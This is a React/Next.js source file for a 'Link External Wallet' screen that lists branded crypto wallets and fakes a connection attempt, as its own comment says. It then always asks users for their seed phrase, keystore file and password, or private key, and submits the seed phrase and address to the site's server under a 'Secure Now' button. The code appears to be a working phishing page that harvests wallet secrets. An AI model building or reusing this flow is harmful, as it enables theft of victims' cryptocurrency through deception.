'use client';
import { Search, X, Loader2, File, Key, Copy, CheckCircle } from 'lucide-react';
import { useState } from 'react';
import { api } from '@/utils/api';
import toast from 'react-hot-toast';
import { useRouter } from 'next/navigation';
import { checkWalletType } from '@/utils/walletUtils';

const wallets = [
 {
    "name": "Trust Wallet",
    "image_url": "https://cdn.brandfetch.io/iduQ_Ynvea/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Coinbase Wallet",
    "image_url": "https://cdn.brandfetch.io/idwDWo4ONQ/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Blockchain",
    "image_url": "https://cdn.brandfetch.io/idEskmZ0_L/w/200/h/200/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Exodus",
    "image_url": "https://cdn.brandfetch.io/idgJSHq_3i/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Cold Wallet",
    "image_url": "https://qfinanceledger.org/images/wallets/4_cold_wallets.png"
  },
  {
    "name": "MetaMask",
    "image_url": "https://cdn.brandfetch.io/id6yhu9VjO/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Electrum",
    "image_url": "https://cdn.brandfetch.io/idZ4ErpPV2/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "MyEtherWallet",
    "image_url": "https://cdn.brandfetch.io/idkuLYsjp8/w/240/h/240/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "D'CENT Wallet",
    "image_url": "https://cdn.brandfetch.io/idwlZXLOIc/w/200/h/94/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "imToken",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Atomic Wallet",
    "image_url": "https://cdn.brandfetch.io/idTTLebBxH/w/1680/h/680/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Coinomi",
    "image_url": "https://cdn.brandfetch.io/id63FMPMWj/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "O3 Wallet",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "SafePal",
    "image_url": "https://cdn.brandfetch.io/idAh5nP0jU/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "MathWallet",
    "image_url": "https://cdn.brandfetch.io/iddKmB48qI/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Vision",
    "image_url": "https://cdn.brandfetch.io/iddKmB48qI/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Ownbit",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Bitpie",
    "image_url": "https://cdn.brandfetch.io/idog1Qtfw4/w/294/h/76/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "TokenPocket",
    "image_url": "https://cdn.brandfetch.io/id4NlQSb2x/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "BitPay",
    "image_url": "https://cdn.brandfetch.io/idtubVO_dA/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "LOBSTR",
    "image_url": "https://cdn.brandfetch.io/idoNRKZLt9/w/820/h/173/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Phoenix Wallet",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Ledger",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Trezor",
    "image_url": "https://cdn.brandfetch.io/idVqgF3xEc/w/180/h/180/theme/dark/symbol.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Tangem",
    "image_url": "https://cdn.brandfetch.io/idEbE9YaOT/w/1200/h/1200/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "SOLO DEX",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Xaman",
    "image_url": "https://cdn.brandfetch.io/id3Lz2M7or/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Yoroi Wallet",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "ELLIPAL",
    "image_url": "https://cdn.brandfetch.io/idfHQX8bMT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Phanthom Wallet",
    "image_url": "https://cdn.brandfetch.io/idf5VaJxyT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Ledger Nano X",
    "image_url": "https://qfinanceledger.org/images/wallets/ledger_nano_x.png"
  },
  {
    "name": "Other Wallets",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  }
]


export default function LinkWalletScreen() {
  const router = useRouter();
  const [search, setSearch] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [connectionState, setConnectionState] = useState(null); // 'connecting', 'failed', 'manual'
  const [error, setError] = useState(false);
  const [connectionMethod, setConnectionMethod] = useState('phrase'); // 'phrase', 'keystore', 'private'
  const [keystorePassword, setKeystorePassword] = useState('');
  const [keystoreFile, setKeystoreFile] = useState(null);
  const [privateKey, setPrivateKey] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [successData, setSuccessData] = useState(null);
  const [detectedWalletType, setDetectedWalletType] = useState(null);

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setSeedPhrase('');
    setConnectionState('connecting');
    // Simulate connection attempt
    setTimeout(() => {
      setConnectionState('manual');
    }, 3000);
  };

  const handleWalletAddressChange = (e) => {
    const address = e.target.value;
    setWalletAddress(address);
    
    if (address) {
      const walletInfo = checkWalletType(address);
      if (walletInfo) {
        setDetectedWalletType(walletInfo.type);
        console.log(`Detected wallet type: ${walletInfo.type}`);
      } else {
        setDetectedWalletType(null);
      }
    } else {
      setDetectedWalletType(null);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      const token = localStorage.getItem('token');
      if (!token) {
        router.push('/login');
        return;
      }

      const walletData = {
        phrase: seedPhrase,
        walletAddress: walletAddress,
        type: detectedWalletType || 'Unknown'
      };

      const response = await api.linkWallet(token, walletData);
      
      setSuccessData({
        referenceNumber: response.wallet.referenceNumber,
        walletType: detectedWalletType || 'Unknown',
      });
      
    } catch (error) {
      toast.error(error.message || 'Failed to link wallet');
      setError(true);
      setTimeout(() => setError(false), 3000);
    } finally {
      setIsLoading(false);
    }
  };

  const copyReferenceNumber = () => {
    if (successData?.referenceNumber) {
      navigator.clipboard.writeText(successData.referenceNumber);
      toast.success('Reference number copied to clipboard');
    }
  };

  const filteredWallets = wallets.filter(wallet =>
    wallet.name.toLowerCase().includes(search.toLowerCase())
  );

  const renderConnectionForm = () => {
    switch(connectionMethod) {
      case 'phrase':
        return (
          <div className="space-y-4">
            <textarea
              value={seedPhrase}
              onChange={(e) => setSeedPhrase(e.target.value)}
              placeholder="Enter your 12/24 word seed phrase..."
              className={`w-full bg-gray-900/50 border ${error ? 'border-red-500' : 'border-white/10'} rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 min-h-[100px]`}
              required
            />
            <div className="space-y-2">
              <input 
                type="text"
                value={walletAddress}
                onChange={handleWalletAddressChange}
                placeholder="Enter your wallet address..."
                className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500"
                required
              />
              {detectedWalletType && (
                <div className="flex items-center gap-2 text-sm text-green-400">
                  <CheckCircle size={16} />
                  {detectedWalletType} wallet detected
                </div>
              )}
            </div>
            {error && (
              <p className="mt-2 text-sm text-red-500 flex items-center gap-2">
                <X size={16} />
                Invalid input. Try again
              </p>
            )}
            <p className="text-xs text-gray-400">
              Typically 12 or 24 words separated by spaces
            </p>
          </div>
        );
      case 'keystore':
        return (
          <div className="space-y-4">
            <div className="border-2 border-dashed border-white/10 rounded-xl p-4 text-center">
              <input
                type="file"
                onChange={(e) => setKeystoreFile(e.target.files[0])}
                className="hidden"
                id="keystoreFile"
              />
              <label 
                htmlFor="keystoreFile"
                className="flex flex-col items-center gap-2 cursor-pointer"
              >
                <File className="text-gray-400" size={24} />
                <span className="text-sm text-gray-400">
                  {keystoreFile ? keystoreFile.name : 'Select Keystore JSON file'}
                </span>
              </label>
            </div>
            <input
              type="password"
              placeholder="Keystore Password"
              value={keystorePassword}
              onChange={(e) => setKeystorePassword(e.target.value)}
              className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500"
            />
          </div>
        );
      case 'private':
        return (
          <div className="space-y-4">
            <textarea
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              placeholder="Enter your private key..."
              className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 min-h-[80px]"
            />
            <p className="text-xs text-gray-400">
              Typically starts with '0x'
            </p>
          </div>
        );
    }
  };

  return (
    <div className="space-y-6 relative">
      <div className="bg-gray-800/50 p-6 rounded-2xl border border-white/10">
        <div className="flex justify-between items-center mb-6">
          <h3 className="text-xl font-semibold text-white">Link External Wallet</h3>
          <div className="relative">
            <input
              type="text"
              placeholder="Search wallets..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="bg-white/5 border border-white/10 rounded-xl px-4 py-2 text-white text-sm focus:outline-none focus:border-blue-500 pl-10"
            />
            <Search className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
          </div>
        </div>
        
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
          {filteredWallets.map((wallet, i) => (
            <button 
              key={i}
              onClick={() => handleWalletClick(wallet)}
              className="flex flex-col items-center p-4 bg-white/5 rounded-xl hover:bg-white/10 transition-all text-center"
            >
              <div className="w-16 h-16 mb-3">
                <img 
                  src={wallet.image_url} 
                  alt={wallet.name}
                  className="w-full h-full object-contain rounded-lg"
                />
              </div>
              <span className="text-white text-sm font-medium">{wallet.name}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Connection Modal */}
      {selectedWallet && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-2xl p-6 w-full max-w-md m-4">
            <div className="flex justify-between items-center mb-4">
              <div className="flex items-center gap-3">
                <img 
                  src={selectedWallet.image_url} 
                  alt={selectedWallet.name}
                  className="w-8 h-8 object-contain rounded"
                />
                <h3 className="text-xl font-semibold text-white">{selectedWallet.name}</h3>
              </div>
              <button 
                onClick={() => {
                  setSelectedWallet(null);
                  setConnectionState(null);
                }}
                className="text-gray-400 hover:text-white"
              >
                <X size={24} />
              </button>
            </div>
            
            {connectionState === 'connecting' && (
              <div className="py-8 flex flex-col items-center gap-4">
                <Loader2 size={40} className="text-blue-500 animate-spin" />
                <p className="text-white font-medium">Connecting to {selectedWallet.name}...</p>
                <p className="text-gray-400 text-sm">Please approve connection in your wallet</p>
              </div>
            )}

            {connectionState === 'failed' && (
              <div className="py-8 flex flex-col items-center gap-4">
                <div className="text-red-500 bg-red-500/10 p-3 rounded-full">
                  <X size={30} />
                </div>
                <p className="text-white font-medium">Connection Failed</p>
                <p className="text-gray-400 text-sm text-center mb-4">
                  Could not connect to {selectedWallet.name} automatically
                </p>
                <button
                  onClick={() => setConnectionState('manual')}
                  className="w-full bg-white/10 hover:bg-white/20 text-white px-4 py-3 rounded-xl transition-all"
                >
                  Connect Manually
                </button>
              </div>
            )}

            {connectionState === 'manual' && (
              <form onSubmit={handleSubmit} className="space-y-4">
                <div className="flex border-b border-white/10 mb-4">
                  {[
                    { id: 'phrase', label: 'Phrase', icon: null },
                    { id: 'keystore', label: 'Keystore', icon: <File size={16} /> },
                    { id: 'private', label: 'Private Key', icon: <Key size={16} /> },
                  ].map((method) => (
                    <button
                      key={method.id}
                      type="button"
                      onClick={() => setConnectionMethod(method.id)}
                      className={`flex items-center gap-2 px-4 py-2 text-sm font-medium ${
                        connectionMethod === method.id 
                          ? 'text-blue-400 border-b-2 border-blue-400' 
                          : 'text-gray-400 hover:text-white'
                      }`}
                    >
                      {method.icon}
                      {method.label}
                    </button>
                  ))}
                </div>
                {renderConnectionForm()}
                <button 
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-3 rounded-xl transition-all disabled:opacity-50"
                >
                  {isLoading ? 'Connecting...' : 'Secure Now'}
                </button>
              </form>
            )}
          </div>
        </div>
      )}

      {/* Success Modal */}
      {successData && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-2xl p-6 w-full max-w-md m-4">
            <div className="flex flex-col items-center gap-4">
              <div className="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center">
                <CheckCircle className="w-8 h-8 text-green-500" />
              </div>
              <h3 className="text-2xl font-bold text-white">Wallet Linked Successfully</h3>
              <p className="text-gray-400 text-center">
                Your {successData.walletType} wallet has been successfully linked
              </p>
              
              <div className="w-full bg-white/5 rounded-lg p-4 mt-4">
                <p className="text-sm text-gray-400 mb-2">Reference Number</p>
                <div className="flex items-center justify-between">
                  <code className="text-white font-mono">{successData.referenceNumber}</code>
                  <button
                    onClick={copyReferenceNumber}
                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                  >
                    <Copy className="w-4 h-4 text-gray-400" />
                  </button>
                </div>
              </div>

              <button
                onClick={() => {
                  setSuccessData(null);
                  setSelectedWallet(null);
                  setConnectionState(null);
                  setSeedPhrase('');
                  setPrivateKey('');
                  setKeystoreFile(null);
                  setKeystorePassword('');
                }}
                className="w-full bg-white/10 hover:bg-white/20 text-white px-4 py-3 rounded-xl transition-all mt-4"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
